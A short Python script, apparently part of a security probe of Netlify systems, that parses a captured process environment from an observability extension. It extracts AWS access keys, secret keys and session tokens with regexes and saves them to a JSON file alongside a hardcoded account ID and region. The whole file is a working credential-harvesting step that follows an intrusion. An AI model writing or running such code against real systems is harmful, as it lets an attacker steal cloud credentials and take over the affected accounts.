# -*- coding: utf-8 -*-
import json, re, os, sys
base = r'D:\scan\netlify_report'

raw = open(os.path.join(base, '_probe4_out.json'), encoding='utf-8', errors='replace').read()
d = json.loads(raw)
env = d.get('proc2', {}).get('environ', '')
print('environ len:', len(env))

def grab(name):
    m = re.search(name + r'=([^|]+)', env)
    return m.group(1) if m else None

ak = grab('AWS_ACCESS_KEY_ID')
sk = grab('AWS_SECRET_ACCESS_KEY')
st = grab('AWS_SESSION_TOKEN')
print('AK:', ak)
print('SK:', (sk or '')[:8] + '...' if sk else None)
print('ST len:', len(st or ''))

if ak and sk and st:
    out = {'access_key': ak, 'secret_key': sk, 'session_token': st,
           'account': '706019798846', 'region': 'us-east-2', 'source': 'proc2-netlify-observability-extension'}
    json.dump(out, open(os.path.join(base, '_aws_creds3.json'), 'w'), indent=1)
    print('saved _aws_creds3.json')
